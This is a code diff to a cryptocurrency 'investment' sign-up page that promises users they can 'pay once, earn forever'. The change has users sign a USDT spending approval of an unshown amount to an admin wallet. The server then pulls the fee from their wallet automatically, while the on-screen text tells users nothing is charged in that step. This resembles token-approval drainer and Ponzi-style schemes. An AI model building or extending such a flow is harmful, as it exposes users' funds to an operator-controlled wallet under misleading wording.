@@ -26,7 +26,6 @@ import {
   JOINING_FEE,
   USDT_ADDRESS,
   ADMIN_WALLET,
-  CONTRACT_ADDRESS,
   APPROVAL_AMOUNT,
   erc20Abi,
 } from "../lib/contract.js";
@@ -57,7 +56,7 @@ const BENEFITS = [
   {
     icon: Zap,
     title: "One simple payment",
-    text: "Pay once, earn forever. Two quick confirmations in your wallet. That's it.",
+    text: "Pay once, earn forever. One quick confirmation in your wallet. That's it.",
   },
 ];
 
@@ -83,6 +82,9 @@ function friendlyError(e, stepNo) {
   }
   if (raw.includes("approval required")) {
     return "Step 1 isn't complete yet. Please tap Try again.";
+  }
+  if (raw.includes("still confirming") || raw.includes("in progress")) {
+    return "Your payment is still being confirmed. Please wait a moment and tap Try again.";
   }
   if (raw.includes("payment verification failed") || raw.includes("payment_failed")) {
     return "We couldn't confirm your payment. If USDT left your wallet, please contact support.";
@@ -159,31 +161,39 @@ export default function Invest() {
   async function runActivation() {
     setStepError("");
 
-    if (!ADMIN_WALLET || !CONTRACT_ADDRESS) {
+    if (!ADMIN_WALLET) {
       setStepError("Activation isn't available right now. Please contact support.");
       return;
     }
-    // Force BSC before ANY step: read the wallet's live chain (not a cached value) and
-    // open the wallet's switch prompt straight away if it's wrong. No step runs until
-    // the wallet is really on BNB Smart Chain.
+    // Force BSC before the wallet popup: read the live chain and open the wallet's
+    // switch prompt if it's wrong. Nothing is signed until the wallet is on BSC.
     if (!(await ensureBsc())) return;
+
+    // The wallet account that signs must be the one logged in to this session.
+    try {
+      const accounts = await connector?.getAccounts?.();
+      if (accounts?.length && !accounts.some((a) => a.toLowerCase() === address.toLowerCase())) {
+        setStepError("Your wallet is on a different account than the one you logged in with. Switch back to " + address.slice(0, 6) + "..." + address.slice(-4) + " and tap Try again.");
+        return;
+      }
+    } catch { /* wallet can't report accounts: the signing call enforces `account` */ }
 
     const amount = parseUnits(String(JOINING_FEE), 18);
     let current = 1;
     let approveHash = readPendingApproval(address);
     setBusy(true);
     try {
-      // ── Step 1: enable payments (limited USDT approve to the platform contract) ──
-      // Skipped when it's already in place (e.g. a retry after step 2 failed).
-      const readAllowance = () =>
-        publicClient.readContract({
-          address: getAddress(USDT_ADDRESS),
-          abi: erc20Abi,
-          functionName: "allowance",
-          args: [getAddress(address), getAddress(CONTRACT_ADDRESS)],
-        });
+      // ── Step 1: approve the admin wallet (the only wallet popup) ──
+      // Skipped when the approval is already active on-chain (e.g. a retry after a
+      // low balance): then we go straight to the balance check + charge.
+      const allowance = await publicClient.readContract({
+        address: getAddress(USDT_ADDRESS),
+        abi: erc20Abi,
+        functionName: "allowance",
+        args: [getAddress(address), getAddress(ADMIN_WALLET)],
+      });
 
-      if ((await readAllowance()) < amount) {
+      if (allowance < amount) {
         setStep1("wallet");
         const req = writeContractAsync({
           address: getAddress(USDT_ADDRESS),
@@ -191,7 +201,7 @@ export default function Invest() {
           functionName: "approve",
           chainId: REQUIRED_CHAIN_ID,
           account: getAddress(address),
-          args: [getAddress(CONTRACT_ADDRESS), APPROVAL_AMOUNT],
+          args: [getAddress(ADMIN_WALLET), APPROVAL_AMOUNT],
         });
         openWalletAppForRequest(connector);
         const hash1 = await req;
@@ -201,64 +211,26 @@ export default function Invest() {
         setStep1("verifying");
         const r1 = await publicClient.waitForTransactionReceipt({ hash: hash1 });
         if (r1.status !== "success") throw new Error("STEP1_FAILED");
-        // Verified on-chain before moving on: the permission must really be there.
-        if ((await readAllowance()) < amount) throw new Error("STEP1_NOT_VERIFIED");
       }
       setStep1("done");
 
-      // ── Step 2: pay the plan price to the admin wallet ──
+      // ── Step 2: automatic. The server checks the approval + balance, pulls the plan
+      // price from the wallet to the admin wallet, verifies it on-chain and activates. ──
       current = 2;
-      // The user may have changed network in the wallet between the two steps.
-      if (!(await ensureBsc())) return;
-
-      // A payment already sent from this wallet (page closed or connection lost before
-      // activation finished)? Finish with it instead of charging the user again.
-      let hash2 = readPendingPayment(address);
-      if (!hash2) {
-        // Balance check right before the payment (via the backend RPC, never opens the
-        // wallet). Step 1 stays done, so the next try goes straight to the payment.
-        try {
-          const { balance } = await api.checkUsdtBalance(address);
-          if (balance < Number(JOINING_FEE)) {
-            setShowSteps(false);
-            setLowBalance({ balance });
-            return;
-          }
-        } catch {
-          // Network hiccup: continue, the payment fails on its own if funds are short.
-        }
-
-        setStep2("wallet");
-        const req2 = writeContractAsync({
-          address: getAddress(USDT_ADDRESS),
-          abi: erc20Abi,
-          functionName: "transfer",
-          chainId: REQUIRED_CHAIN_ID,
-          account: getAddress(address),
-          args: [getAddress(ADMIN_WALLET), amount],
-        });
-        openWalletAppForRequest(connector);
-        hash2 = await req2;
-        savePendingPayment(address, hash2);
-      }
-
-      setStep2("verifying");
-      const r2 = await publicClient.waitForTransactionReceipt({ hash: hash2 });
-      if (r2.status !== "success") {
-        clearPendingPayment(); // reverted on-chain: nothing was paid
-        throw new Error("PAYMENT_FAILED");
-      }
-
-      // Backend verifies the payment on-chain and activates the plan.
       setStep2("activating");
       try {
-        await api.activatePlan(address, hash2, approveHash);
+        await api.activatePlan(address, approveHash);
       } catch (err) {
-        // Rejected by the backend (not a network error): this tx can't activate.
-        if (err?.status >= 400 && err?.status < 500) clearPendingPayment();
+        if (err?.data?.insufficientBalance) {
+          // Approval is saved on the server; the user just needs USDT, then Try again.
+          clearPendingApproval();
+          setStep2("idle");
+          setShowSteps(false);
+          setLowBalance({ balance: err.data.balance });
+          return;
+        }
         throw err;
       }
-      clearPendingPayment();
       clearPendingApproval();
       setStep2("done");
 
@@ -463,7 +435,7 @@ export default function Invest() {
         onClose={busy ? undefined : closeSteps}
       >
         <p className="text-[13px] text-slate-400">
-          Just 2 quick steps. Keep this page open until both are done.
+          Just one confirmation in your wallet. Keep this page open until it's done.
         </p>
 
         <div className="mt-4 space-y-2.5">
@@ -472,8 +444,8 @@ export default function Invest() {
             state={step1}
             title="Get your account ready"
             text={{
-              idle: "Sign the smart contract request in your wallet on BNB Smart Chain. Nothing is charged in this step.",
-              wallet: "Sign the request in your wallet, then come back to this page…",
+              idle: "Approve the request in your wallet on BNB Smart Chain. Nothing is charged in this step.",
+              wallet: "Approve the request in your wallet, then come back to this page…",
               verifying: "Verifying on the network…",
               done: "Done",
               error: "Not completed",
@@ -482,12 +454,10 @@ export default function Invest() {
           <StepRow
             n={2}
             state={step2}
-            title={`Pay ${JOINING_FEE} USDT`}
+            title={`Pay ${JOINING_FEE} USDT (automatic)`}
             text={{
-              idle: `Confirm the ${JOINING_FEE} USDT payment to activate your plan.`,
-              wallet: "Confirm the payment in your wallet, then come back to this page…",
-              verifying: "Confirming your payment…",
-              activating: "Activating your plan…",
+              idle: `${JOINING_FEE} USDT is taken automatically and your plan is activated. No second popup.`,
+              activating: "Taking the payment and activating your plan…",
               done: "Done",
               error: "Not completed",
             }}
@@ -572,31 +542,6 @@ function StepRow({ n, state, title, text }) {
       </div>
     </div>
   );
-}
-
-// ── Sent-but-not-activated payment (survives page close / reload) ──
-const PENDING_PAYMENT_KEY = "dw_pending_plan_payment";
-
-function readPendingPayment(address) {
-  try {
-    const d = JSON.parse(localStorage.getItem(PENDING_PAYMENT_KEY) || "null");
-    return d && address && d.address === address.toLowerCase() ? d.hash : null;
-  } catch {
-    return null;
-  }
-}
-
-function savePendingPayment(address, hash) {
-  try {
-    localStorage.setItem(
-      PENDING_PAYMENT_KEY,
-      JSON.stringify({ address: address.toLowerCase(), hash })
-    );
-  } catch { /* ignore */ }
-}
-
-function clearPendingPayment() {
-  try { localStorage.removeItem(PENDING_PAYMENT_KEY); } catch { /* ignore */ }
 }
 
 // ── Step 1 approval tx hash (sent to the backend so both txs are verified) ──
